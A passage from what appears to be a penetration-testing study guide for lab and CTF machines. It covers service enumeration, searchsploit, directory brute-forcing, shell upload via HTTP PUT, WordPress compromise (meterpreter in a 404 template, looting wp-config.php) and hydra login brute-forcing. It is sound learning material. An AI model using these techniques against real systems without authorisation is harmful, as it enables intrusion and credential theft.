<span class="n">scanme</span><span class="o">.</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="n">has</span> <span class="n">IPv6</span> <span class="n">address</span> <span class="mi">2600</span><span class="p">:</span><span class="mi">3</span><span class="n">c01</span><span class="p">::</span><span class="n">f03c</span><span class="p">:</span><span class="mi">91</span><span class="n">ff</span><span class="p">:</span><span class="n">fe18</span><span class="p">:</span><span class="n">bb2f</span>
</pre></div>
</div>
<div class="admonition tip">
<p class="admonition-title">Tip</p>
<p>Usually, DNS runs on UDP Port. However, If DNS is running on TCP port, probably DNS Zone Transfer would be possible.</p>
</div>
</section>
<section id="ssl-certificate">
<h3>SSL Certificate<a class="headerlink" href="#ssl-certificate" title="Link to this heading"></a></h3>
<p>If the targeted machine is running an https server and we are getting an apache default webpage on hitting the <a class="reference external" href="https://IPAddress">https://IPAddress</a>, virtual hosts would be probably in use. Check the alt-dns-name on the ssl-certificate, create an entry in hosts file (/etc/hosts) and check what is being hosted on these domain names by surfing to <a class="reference external" href="https://alt-dns-name">https://alt-dns-name</a>.</p>
<p>nmap service scan result for port 443 (sample)</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">|</span> <span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span> <span class="n">Subject</span><span class="p">:</span> <span class="n">commonName</span><span class="o">=</span><span class="n">examplecorp</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">organizationName</span><span class="o">=</span><span class="n">ExampleCorp</span> <span class="n">Ltd</span><span class="o">./</span><span class="n">stateOrProvinceName</span><span class="o">=</span><span class="n">Attica</span><span class="o">/</span><span class="n">countryName</span><span class="o">=</span><span class="n">IN</span><span class="o">/</span><span class="n">localityName</span><span class="o">=</span><span class="n">Mumbai</span><span class="o">/</span><span class="n">organizationalUnitName</span><span class="o">=</span><span class="n">IT</span><span class="o">/</span><span class="n">emailAddress</span><span class="o">=</span><span class="n">admin</span><span class="nd">@examplecorp</span><span class="o">.</span><span class="n">com</span>
<span class="o">|</span> <span class="n">Subject</span> <span class="n">Alternative</span> <span class="n">Name</span><span class="p">:</span> <span class="n">DNS</span><span class="p">:</span><span class="n">www</span><span class="o">.</span><span class="n">examplecorp</span><span class="o">.</span><span class="n">com</span><span class="p">,</span> <span class="n">DNS</span><span class="p">:</span><span class="n">admin</span><span class="o">-</span><span class="n">portal</span><span class="o">.</span><span class="n">examplecorp</span><span class="o">.</span><span class="n">com</span>
</pre></div>
</div>
</section>
</section>
<section id="from-nothing-to-a-unprivileged-shell">
<span id="from-nothing-to-unprivileged-shell"></span><h2>From Nothing to a Unprivileged Shell<a class="headerlink" href="#from-nothing-to-a-unprivileged-shell" title="Link to this heading"></a></h2>
<p>At this point, we would have an idea about the different services and service version running on the system. Besides the output given by nmap. It is also recommended to check what software is being used on the webservers (e.g. certain cms’s)</p>
<section id="searchsploit">
<h3>searchsploit<a class="headerlink" href="#searchsploit" title="Link to this heading"></a></h3>
<p>Exploit Database Archive Search</p>
<p>First of all, we check if the operating system and/ or the exposed services are vulnerable to exploits which are already available on the internet. For example, a vulnerable service webmin is present in one of the VMs which could be exploited to extract information from the system.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">root</span><span class="nd">@kali</span><span class="p">:</span><span class="o">~</span><span class="c1"># nmap -sV -A 172.16.73.128</span>
<span class="o">**********</span><span class="n">Trimmed</span><span class="o">**************</span>
<span class="mi">10000</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>        <span class="n">MiniServ</span> <span class="mf">0.01</span> <span class="p">(</span><span class="n">Webmin</span> <span class="n">httpd</span><span class="p">)</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">methods</span><span class="p">:</span> <span class="n">No</span> <span class="n">Allow</span> <span class="ow">or</span> <span class="n">Public</span> <span class="n">header</span> <span class="ow">in</span> <span class="n">OPTIONS</span> <span class="n">response</span> <span class="p">(</span><span class="n">status</span> <span class="n">code</span> <span class="mi">200</span><span class="p">)</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Site</span> <span class="n">doesn</span><span class="s1">&#39;t have a title (text/html; Charset=iso-8859-1).</span>
<span class="o">|</span> <span class="n">ndmp</span><span class="o">-</span><span class="n">version</span><span class="p">:</span>
<span class="o">|</span><span class="n">_</span>  <span class="n">ERROR</span><span class="p">:</span> <span class="n">Failed</span> <span class="n">to</span> <span class="n">get</span> <span class="n">host</span> <span class="n">information</span> <span class="kn">from</span> <span class="nn">server</span>
<span class="o">**********</span><span class="n">Trimmed</span><span class="o">**************</span>
</pre></div>
</div>
<p>If we search for webmin with searchsploit, we will find different exploits available for it and we just have to use the correct one based on utility and the matching version.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">root</span><span class="nd">@kali</span><span class="p">:</span><span class="o">~</span><span class="c1"># searchsploit webmin</span>
<span class="o">**********</span><span class="n">Trimmed</span><span class="o">**************</span>
<span class="n">Description</span>                                                                            <span class="n">Path</span>
<span class="o">----------------------------------------------------------------------------------------------------------------</span>
<span class="n">Webmin</span> <span class="o">&lt;</span> <span class="mf">1.290</span> <span class="o">/</span> <span class="n">Usermin</span> <span class="o">&lt;</span> <span class="mf">1.220</span> <span class="n">Arbitrary</span> <span class="n">File</span> <span class="n">Disclosure</span> <span class="n">Exploit</span>                   <span class="o">|</span> <span class="o">/</span><span class="n">multiple</span><span class="o">/</span><span class="n">remote</span><span class="o">/</span><span class="mf">1997.</span><span class="n">php</span>
<span class="n">Webmin</span> <span class="o">&lt;</span> <span class="mf">1.290</span> <span class="o">/</span> <span class="n">Usermin</span> <span class="o">&lt;</span> <span class="mf">1.220</span> <span class="n">Arbitrary</span> <span class="n">File</span> <span class="n">Disclosure</span> <span class="n">Exploit</span> <span class="p">(</span><span class="n">perl</span><span class="p">)</span>            <span class="o">|</span> <span class="o">/</span><span class="n">multiple</span><span class="o">/</span><span class="n">remote</span><span class="o">/</span><span class="mf">2017.</span><span class="n">pl</span>
<span class="n">Webmin</span> <span class="mf">1.</span><span class="n">x</span> <span class="n">HTML</span> <span class="n">Email</span> <span class="n">Command</span> <span class="n">Execution</span> <span class="n">Vulnerability</span>                                <span class="o">|</span> <span class="o">/</span><span class="n">cgi</span><span class="o">/</span><span class="n">webapps</span><span class="o">/</span><span class="mf">24574.</span><span class="n">txt</span>
<span class="o">**********</span><span class="n">Trimmed</span><span class="o">**************</span>
</pre></div>
</div>
<p>Once we have figured out which exploit to check we can read about it by using the file-number. For example: 1997, 2017, 24574 in the above case.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">searchsploit</span> <span class="o">-</span><span class="n">x</span> <span class="mi">24674</span>
</pre></div>
</div>
<p>Searchsploit provides an option to read the nmap XML file and suggest vulnerabilities (Requires nmap -sV -x xmlfile).</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">searchsploit</span>
     <span class="o">--</span><span class="n">nmap</span>     <span class="p">[</span><span class="n">file</span><span class="o">.</span><span class="n">xml</span><span class="p">]</span>  <span class="n">Checks</span> <span class="nb">all</span> <span class="n">results</span> <span class="ow">in</span> <span class="n">Nmap</span><span class="s1">&#39;s XML output with service version (e.g.: nmap -sV -oX file.xml).</span>
                            <span class="n">Use</span> <span class="s2">&quot;-v&quot;</span> <span class="p">(</span><span class="n">verbose</span><span class="p">)</span> <span class="n">to</span> <span class="k">try</span> <span class="n">even</span> <span class="n">more</span> <span class="n">combinations</span>
</pre></div>
</div>
<div class="admonition tip">
<p class="admonition-title">Tip</p>
<p>If we don’t manage to find an exploit for a specific version, it is recommended to check the notes of the exploits which are highlighted as they may be valid for lower versions too. For example Let’s say we are searching for exploits in Example_Software version 2.1.3. However, version 2.2.2 contains multiple vulnerablities. Reading the description for 2.2.2 we find out it’s valid for lower versions too.</p>
</div>
</section>
<section id="seclists-org-security-mailing-list-archive">
<h3>SecLists.Org Security Mailing List Archive<a class="headerlink" href="#seclists-org-security-mailing-list-archive" title="Link to this heading"></a></h3>
<p>There will be some days, when you won’t find vulnerabilities with searchsploit. In this case, we should also check the <a class="reference external" href="http://seclists.org/">SecLists.Org Security Mailing List Archive</a>, if someone has reported any bug(s) for that particular software that we can exploit.</p>
</section>
<section id="google-vulns">
<h3>Google-Vulns<a class="headerlink" href="#google-vulns" title="Link to this heading"></a></h3>
<p>It is suggested that whenever you are googling something,  you add words such as vulnerability, exploit, ctf, github, python, tool etc. to your search term. For example. Let’s say, you are stuck in a docker or on a specific cms search for docker ctf or &lt;cms_name&gt; ctf/ github etc.</p>
</section>
<section id="webservices">
<h3>Webservices<a class="headerlink" href="#webservices" title="Link to this heading"></a></h3>
<p>If a webserver is running on a machine, we can start with running</p>
<section id="whatweb">
<h4>whatweb<a class="headerlink" href="#whatweb" title="Link to this heading"></a></h4>
<p>Utilize whatweb to find what software stack a server is running.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>whatweb www.example.com
http://www.example.com [200 OK] Cookies[ASP.NET_SessionId,CMSPreferredCulture,citrix_ns_id], Country[INDIA][IN], Email[infosecurity@zmail.example.com], Google-Analytics[Universal][UA-6386XXXXX-2], HTML5, HTTPServer[Example Webserver], HttpOnly[ASP.NET_SessionId,CMSPreferredCulture,citrix_ns_id], IP[XXX.XX.XX.208], JQuery[1.11.0], Kentico-CMS, Modernizr, Script[text/javascript], Title[Welcome to Example Website ][Title element contains newline(s)!], UncommonHeaders[cteonnt-length,x-cache-control-orig,x-expires-orig], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=9,IE=edge]
</pre></div>
</div>
</section>
<section id="nikto">
<h4>nikto<a class="headerlink" href="#nikto" title="Link to this heading"></a></h4>
<p>nikto - Scans a web server for known vulnerabilities.</p>
<p>It will examine a web server to find potential problems and security vulnerabilities, including:</p>
<ul class="simple">
<li><p>Server and software misconfigurations</p></li>
<li><p>Default files and programs</p></li>
<li><p>Insecure files and programs</p></li>
<li><p>Outdated servers and programs</p></li>
</ul>
</section>
<section id="dirb-wfuzz-dirbuster">
<h4>dirb, wfuzz, dirbuster<a class="headerlink" href="#dirb-wfuzz-dirbuster" title="Link to this heading"></a></h4>
<p>Furthermore, we can run the following programs to find any hidden directories.</p>
<ul class="simple">
<li><p><a class="reference external" href="https://tools.kali.org/web-applications/dirb">DIRB</a> is a Web Content Scanner. It looks for existing (and/ or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server and analysing the response.</p></li>
<li><p><a class="reference external" href="https://tools.kali.org/web-applications/wfuzz">wfuzz</a> - a web application bruteforcer. Wfuzz might be useful when you are looking for webpage of a certain size. For example: Let’s say, when we dirb we get 50 directories. Each directory containing an image. Often, we then need to figure out which image is different. In this case, we would figure out what’s the size of the normal image and hide that particular response with wfuzz.</p></li>
<li><p><a class="reference external" href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">Dirbuster</a> : DirBuster is a multi threaded java application designed to brute force directories and files names on web/ application servers.</p></li>
<li><p><a class="reference external" href="https://github.com/OJ/gobuster">gobuster</a> : Gobuster is a tool used to brute-force URIs (directories and files) in web sites and DNS subdomains (with wildcard support). (golang can be installed using apt-get).</p></li>
</ul>
<div class="admonition tip">
<p class="admonition-title">Tip</p>
<p>Most likely, we will be using common.txt (/usr/share/wordlists/dirb/) . If it’s doesn’t find anything, it’s better to double check with /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt which is a list of directories that where found on at least 2 different hosts when DirBuster project crawled the internet. Even if that doesn’t work out, try searching with extensions such as .txt, .js, .html, .php. (.txt by default and rest application based)</p>
</div>
<div class="admonition tip">
<p class="admonition-title">Tip</p>
<p>If using the dirb/ wfuzz wordlist doesn’t result in any directories and the website contains a lot of text, it might be a good idea to use cewl to create a wordlist and utilize that as a dictionary to find hidden directories. Also, it sometimes make sense to dirb/wfuzz the IPAddress instead of the hostname like filesrv.example.com (Maybe found by automatic redirect)</p>
</div>
<div class="admonition tip">
<p class="admonition-title">Tip</p>
<p>It’s important to know that dirb shows the directories found based on the response code, so if a web-application shows 404 status code instead of 200, dirbuster would miss it. In that case, wfuzz or gobuster or Burpsuite would help as they check for response length too.</p>
</div>
</section>
<section id="burpsuite-spider">
<h4>BurpSuite Spider<a class="headerlink" href="#burpsuite-spider" title="Link to this heading"></a></h4>
<p>There will be some cases when dirb/ dirbuster doesn’t find anything. This happened with us on a Node.js web application. Burpsuite’s spider helped in finding extra-pages which contained the credentials.</p>
</section>
<section id="parameter-fuzz">
<h4>Parameter Fuzz?<a class="headerlink" href="#parameter-fuzz" title="Link to this heading"></a></h4>
<p>Sometimes, we might have a scenario where we have a website which might be protected by a WAF.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">IP</span><span class="o">/</span><span class="n">example</span>
</pre></div>
</div>
<p>Now, this “/example” might be a php or might be accepting a GET Parameter. In that case, we probably need to fuzz it. The hardest part is that we can only find the GET parameters by fuzzing “/example” if you get some errors from the application, so the goal is to fuzz using a special char as the parameter’s value, something like: “/example?FUZZ=’ “</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">wfuzz</span> <span class="o">-</span><span class="n">c</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">dirbuster</span><span class="o">/</span><span class="n">directory</span><span class="o">-</span><span class="nb">list</span><span class="o">-</span><span class="mf">2.3</span><span class="o">-</span><span class="n">medium</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">H</span> <span class="s2">&quot;User-Agent: SomethingNotObivousforWAF&quot;</span> <span class="s2">&quot;http://IP/example?FUZZ=&#39;&quot;</span>
</pre></div>
</div>
<p>The other things which we may try is putting a valid command such as ‘ls, test’ so it becomes FUZZ=ls or FUZZ=test</p>
</section>
<section id="put-method">
<h4>PUT Method<a class="headerlink" href="#put-method" title="Link to this heading"></a></h4>
<p>Sometimes, it is also a good idea to check the various HTTP verbs that are available such as GET, PUT, DELETE, etc. This can be done by making an <strong>OPTIONS</strong> request.</p>
<p>Curl can be used to check the available options (supported http verbs):</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>curl -X OPTIONS -v http://192.168.126.129/test/
Trying 192.168.126.129…
Connected to 192.168.126.129 (192.168.126.129) port 80 (#0)
&gt; OPTIONS /test/ HTTP/1.1
&gt; Host: 192.168.126.129
&gt; User-Agent: curl/7.47.0
&gt; Accept: /
&gt;
&lt; HTTP/1.1 200 OK
&lt; DAV: 1,2
&lt; MS-Author-Via: DAV
&lt; Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
&lt; Allow: OPTIONS, GET, HEAD, POST
&lt; Content-Length: 0
&lt; Date: Fri, 29 Apr 2016 09:41:19 GMT
&lt; Server: lighttpd/1.4.28
&lt;
* Connection #0 to host 192.168.126.129 left intact
</pre></div>
</div>
<p>The PUT method allows you to upload a file which can help us to get a shell on the machine. There are multiple methods available for uploading a file with the PUT method mentioned on <a class="reference external" href="http://www.smeegesec.com/2014/10/detecting-and-exploiting-http-put-method.html">Detecting and exploiting the HTTP Put Method</a></p>
<p>A few are:</p>
<ul class="simple">
<li><p>Nmap:</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">p</span> <span class="mi">80</span> <span class="o">--</span><span class="n">script</span> <span class="n">http</span><span class="o">-</span><span class="n">put</span> <span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span> <span class="n">http</span><span class="o">-</span><span class="n">put</span><span class="o">.</span><span class="n">url</span><span class="o">=</span><span class="s1">&#39;/uploads/rootme.php&#39;</span><span class="p">,</span><span class="n">http</span><span class="o">-</span><span class="n">put</span><span class="o">.</span><span class="n">file</span><span class="o">=</span><span class="s1">&#39;/tmp/rootme.php&#39;</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>curl:</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">curl</span> <span class="o">--</span><span class="n">upload</span><span class="o">-</span><span class="n">file</span> <span class="n">test</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">v</span> <span class="o">--</span><span class="n">url</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.126.129</span><span class="o">/</span><span class="n">test</span><span class="o">/</span><span class="n">test</span><span class="o">.</span><span class="n">txt</span>
</pre></div>
</div>
<p>or</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">curl</span> <span class="o">-</span><span class="n">X</span> <span class="n">PUT</span> <span class="o">-</span><span class="n">d</span> <span class="s1">&#39;</span>
<span class="n">curl</span> <span class="o">-</span><span class="n">i</span> <span class="o">-</span><span class="n">X</span> <span class="n">PUT</span> <span class="o">-</span><span class="n">H</span> <span class="s2">&quot;Content-Type: application/xml; charset=utf-8&quot;</span> <span class="o">-</span><span class="n">d</span> <span class="o">@</span><span class="s2">&quot;/tmp/some-file.xml&quot;</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">IPAddress</span><span class="o">/</span><span class="n">newpage</span>
<span class="n">curl</span> <span class="o">-</span><span class="n">X</span> <span class="n">PUT</span> <span class="o">-</span><span class="n">d</span> <span class="s2">&quot;text or data to put&quot;</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">IPAddress</span><span class="o">/</span><span class="n">destination_page</span>
<span class="n">curl</span> <span class="o">-</span><span class="n">i</span> <span class="o">-</span><span class="n">H</span> <span class="s2">&quot;Accept: application/json&quot;</span> <span class="o">-</span><span class="n">X</span> <span class="n">PUT</span> <span class="o">-</span><span class="n">d</span> <span class="s2">&quot;text or data to put&quot;</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">IPAddress</span><span class="o">/</span><span class="n">new_page</span>
</pre></div>
</div>
</div></blockquote>
</section>
<section id="wordpress">
<h4>Wordpress<a class="headerlink" href="#wordpress" title="Link to this heading"></a></h4>
<p>When faced with a website that makes use of the wordpress CMS one can run wpscan. Make sure you run --enumerate u for enumerating usernames because by default wpscan doesn’t run it. Also, scan for plugins</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">wpsscan</span>
  <span class="o">--</span><span class="n">url</span>       <span class="o">|</span> <span class="o">-</span><span class="n">u</span> <span class="o">&lt;</span><span class="n">target</span> <span class="n">url</span><span class="o">&gt;</span>       <span class="n">The</span> <span class="n">WordPress</span> <span class="n">URL</span><span class="o">/</span><span class="n">domain</span> <span class="n">to</span> <span class="n">scan</span><span class="o">.</span>
  <span class="o">--</span><span class="n">force</span>     <span class="o">|</span> <span class="o">-</span><span class="n">f</span>                    <span class="n">Forces</span> <span class="n">WPScan</span> <span class="n">to</span> <span class="ow">not</span> <span class="n">check</span> <span class="k">if</span> <span class="n">the</span> <span class="n">remote</span> <span class="n">site</span> <span class="ow">is</span> <span class="n">running</span> <span class="n">WordPress</span><span class="o">.</span>
  <span class="o">--</span><span class="nb">enumerate</span> <span class="o">|</span> <span class="o">-</span><span class="n">e</span> <span class="p">[</span><span class="n">option</span><span class="p">(</span><span class="n">s</span><span class="p">)]</span>        <span class="n">Enumeration</span><span class="o">.</span>
  <span class="n">option</span> <span class="p">:</span>
      <span class="n">u</span>        <span class="n">usernames</span> <span class="kn">from</span> <span class="nn">id</span> <span class="mi">1</span> <span class="n">to</span> <span class="mi">10</span>
      <span class="n">u</span><span class="p">[</span><span class="mi">10</span><span class="o">-</span><span class="mi">20</span><span class="p">]</span> <span class="n">usernames</span> <span class="kn">from</span> <span class="nn">id</span> <span class="mi">10</span> <span class="n">to</span> <span class="mi">20</span> <span class="p">(</span><span class="n">you</span> <span class="n">must</span> <span class="n">write</span> <span class="p">[]</span> <span class="n">chars</span><span class="p">)</span>
      <span class="n">p</span>        <span class="n">plugins</span>
      <span class="n">vp</span>       <span class="n">only</span> <span class="n">vulnerable</span> <span class="n">plugins</span>
      <span class="n">ap</span>       <span class="nb">all</span> <span class="n">plugins</span> <span class="p">(</span><span class="n">can</span> <span class="n">take</span> <span class="n">a</span> <span class="n">long</span> <span class="n">time</span><span class="p">)</span>
      <span class="n">tt</span>       <span class="n">timthumbs</span> <span class="p">(</span><span class="n">vulnerability</span> <span class="n">scanner</span><span class="p">)</span>
      <span class="n">t</span>        <span class="n">themes</span>
      <span class="n">vt</span>       <span class="n">only</span> <span class="n">vulnerable</span> <span class="n">themes</span>
      <span class="n">at</span>       <span class="nb">all</span> <span class="n">themes</span> <span class="p">(</span><span class="n">can</span> <span class="n">take</span> <span class="n">a</span> <span class="n">long</span> <span class="n">time</span><span class="p">)</span>
      <span class="n">Multiple</span> <span class="n">values</span> <span class="n">are</span> <span class="n">allowed</span> <span class="p">:</span> <span class="s2">&quot;-e tt,p&quot;</span> <span class="n">will</span> <span class="nb">enumerate</span> <span class="n">timthumbs</span> <span class="ow">and</span> <span class="n">plugins</span>

      <span class="n">If</span> <span class="n">no</span> <span class="n">option</span> <span class="ow">is</span> <span class="n">supplied</span><span class="p">,</span> <span class="n">the</span> <span class="n">default</span> <span class="ow">is</span> <span class="s2">&quot;vt,tt,u,vp&quot;</span>
      <span class="p">(</span><span class="n">only</span> <span class="n">vulnerable</span> <span class="n">themes</span><span class="p">,</span> <span class="n">timthumbs</span><span class="p">,</span> <span class="n">usernames</span> <span class="kn">from</span> <span class="nn">id</span> <span class="mi">1</span> <span class="n">to</span> <span class="mi">10</span><span class="p">,</span> <span class="n">only</span> <span class="n">vulnerable</span> <span class="n">plugins</span><span class="p">)</span>
</pre></div>
</div>
<p>We can also use wpscan to bruteforce passwords for a given username</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">wpscan</span> <span class="o">--</span><span class="n">url</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.1.2</span> <span class="o">--</span><span class="n">wordlist</span> <span class="n">wordlist</span><span class="o">.</span><span class="n">txt</span> <span class="o">--</span><span class="n">username</span> <span class="n">example_username</span>
</pre></div>
</div>
<p><strong>Tips</strong></p>
<ul class="simple">
<li><p>wpscan scans the themes, plugins by passive scanning, if we are not finding anything, it might be good idea to do scanning with all plugins (ap) and all themes (at). Sometimes, plugin may fake their version, so probably, good idea to readme and check for vulns.</p></li>
<li><p>If we have found a username and password of wordpress with admin privileges, we can upload a php meterpreter. One of the possible ways is to go to Appearance &gt; Editor &gt; Edit 404 Template.</p></li>
<li><p>The configuration of worpdress is normally speaking stored in <strong>wp-config.php</strong>. If you are able to download it, you might be lucky and be able to loot plaintext username and passwords to the database or wp-admin page.</p></li>
<li><p>If the website is vulnerable for SQL-Injection. We should be able to extract the wordpress users and their password hashes. However, if the password hash is not crackable. Probably, check the wp-posts table as it might contain some hidden posts.</p></li>
<li><p>Got wordpress credentials, maybe utilize <a class="reference external" href="https://wordpress.org/plugins/wpterm/">WPTerm</a> an xterm-like plugin. It can be used to run non-interactive shell commands from the WordPress admin dashboard.</p></li>
<li><p>If there’s a custom plugin created, it would probably be in the location</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">IP</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">plugins</span><span class="o">/</span><span class="n">custompluginname</span>
</pre></div>
</div>
</div></blockquote>
<div class="admonition-todo admonition" id="id8">
<p class="admonition-title">Todo</p>
<p>what is the (standard) format of a wp hash and where in the database is it stored? Elborate more on wp scanning and vulnerabilities?</p>
</div>
</section>
<section id="names-possible-usernames-passwords">
<h4>Names? Possible Usernames &amp; Passwords?<a class="headerlink" href="#names-possible-usernames-passwords" title="Link to this heading"></a></h4>
<p>Sometimes, when visiting webpages, you will find possible names of the employees working in the company. It is common practice to have a username based on your first/ last name. Superkojiman has written <a class="reference external" href="https://gist.githubusercontent.com/superkojiman/11076951/raw/8b0d545a30fd76cb7808554b1c6e0e26bc524d51/namemash.py">namemash.py</a> which could be used to create possible usernames. However, after completion we are left with a large amount of potential usernames with no passwords.</p>
<p>If the vulnerable machine is running a SMTP mail server, we can verify if a particular username exists or not.</p>
<ul class="simple">
<li><p>Using metasploit smtp_enum module: Once msfconsole is running, use auxiliary/scanner/smtp/smtp_enum, enter the RHOSTS (target address) and USER FILE containing the list of probable user accounts.</p></li>
<li><p>Using VRFY command:</p></li>
<li><p>Using RCPT TO command:</p></li>
</ul>
<p>Once we have identified a pattern of username creation, we may modify namemash.py to generate usernames and check if they exist or not.</p>
</section>
<section id="brute-forcing-hydra">
<h4>Brute forcing: hydra<a class="headerlink" href="#brute-forcing-hydra" title="Link to this heading"></a></h4>
<p>Hydra can be used to brute force login web pages</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">-</span><span class="n">l</span> <span class="n">LOGIN</span> <span class="ow">or</span> <span class="o">-</span><span class="n">L</span> <span class="n">FILE</span> <span class="n">login</span> <span class="k">with</span> <span class="n">LOGIN</span> <span class="n">name</span><span class="p">,</span> <span class="ow">or</span> <span class="n">load</span> <span class="n">several</span> <span class="n">logins</span> <span class="kn">from</span> <span class="nn">FILE</span>  <span class="p">(</span><span class="n">userlist</span><span class="p">)</span>
<span class="o">-</span><span class="n">p</span> <span class="n">PASS</span>  <span class="ow">or</span> <span class="o">-</span><span class="n">P</span> <span class="n">FILE</span> <span class="k">try</span> <span class="n">password</span> <span class="n">PASS</span><span class="p">,</span> <span class="ow">or</span> <span class="n">load</span> <span class="n">several</span> <span class="n">passwords</span> <span class="kn">from</span> <span class="nn">FILE</span>  <span class="p">(</span><span class="n">passwordlist</span><span class="p">)</span>
<span class="o">-</span><span class="n">U</span>        <span class="n">service</span> <span class="n">module</span> <span class="n">usage</span> <span class="n">details</span>
<span class="o">-</span><span class="n">e</span> <span class="n">nsr</span> <span class="n">additional</span> <span class="n">checks</span><span class="p">,</span> <span class="s2">&quot;n&quot;</span> <span class="k">for</span> <span class="n">null</span> <span class="n">password</span><span class="p">,</span> <span class="s2">&quot;s&quot;</span> <span class="k">try</span> <span class="n">login</span> <span class="k">as</span> <span class="k">pass</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span> <span class="k">try</span> <span class="n">the</span> <span class="n">reverse</span> <span class="n">login</span> <span class="k">as</span> <span class="k">pass</span>
</pre></div>
</div>
<p>hydra http-post-form:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">hydra</span> <span class="o">-</span><span class="n">U</span> <span class="n">http</span><span class="o">-</span><span class="n">post</span><span class="o">-</span><span class="n">form</span>
</pre></div>
</div>
<p><strong>Help for module http-post-form</strong></p>
<p>Module http-post-form requires the page and the parameters for the web form.</p>
<p>The parameters take three “:” separated values, plus optional values.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Syntax</span><span class="p">:</span>   <span class="o">&lt;</span><span class="n">url</span><span class="o">&gt;</span><span class="p">:</span><span class="o">&lt;</span><span class="n">form</span> <span class="n">parameters</span><span class="o">&gt;</span><span class="p">:</span><span class="o">&lt;</span><span class="n">condition</span> <span class="n">string</span><span class="o">&gt;</span><span class="p">[:</span><span class="o">&lt;</span><span class="n">optional</span><span class="o">&gt;</span><span class="p">[:</span><span class="o">&lt;</span><span class="n">optional</span><span class="o">&gt;</span><span class="p">]</span>
</pre></div>
</div>
<ul class="simple">
<li><p>First is the page on the server to send a GET or POST request to (URL).</p></li>
<li><p>Second is the POST/GET variables (taken from either the browser, proxy, etc. with usernames and passwords being replaced with the “^USER^” and “^PASS^” placeholders (FORM PARAMETERS)</p></li>
<li><p>Third is the string that it checks for an <em>invalid</em> login (by default). Invalid condition login check can be preceded by “F=”, successful condition login check must be preceded by “S=”. This is where most people get it wrong. You have to check the webapp what a failed string looks like and put it in this parameter!</p></li>
<li><p>The following parameters are optional:
C=/page/uri          to define a different page to gather initial cookies from
(h|H)=My-Hdr: foo   to send a user defined HTTP header with each request ^USER^ and ^PASS^ can also be put into these headers!</p></li>
</ul>
<blockquote>
<div><ul class="simple">
<li><p>Note:</p></li>
</ul>
<blockquote>
<div><ul class="simple">
<li><p>‘h’ will add the user-defined header at the end regardless it’s already being sent by Hydra or not.</p></li>
<li><p>‘H’ will replace the value of that header if it exists, by the one supplied by the user, or add the header at the end</p></li>
</ul>
</div></blockquote>
<ul class="simple">
<li><p>Note that if you are going to put colons (:) in your headers you should escape them with a backslash (). All colons that are not option separators should be escaped (see the examples above and below). You can specify a header without escaping the colons, but that way you will not be able to put colons in the header value itself, as they will be interpreted by hydra as option separators.</p></li>
</ul>
</div></blockquote>
<p>Examples:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="s2">&quot;/login.php:user=^USER^&amp;pass=^PASS^:incorrect&quot;</span>
<span class="s2">&quot;/login.php:user=^USER^&amp;pass=^PASS^&amp;colon=colon\:escape:S=authlog=.*success&quot;</span>
<span class="s2">&quot;/login.php:user=^USER^&amp;pass=^PASS^&amp;mid=123:authlog=.*failed&quot;</span>
<span class="s2">&quot;/:user=^USER&amp;pass=^PASS^:failed:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^&quot;</span>
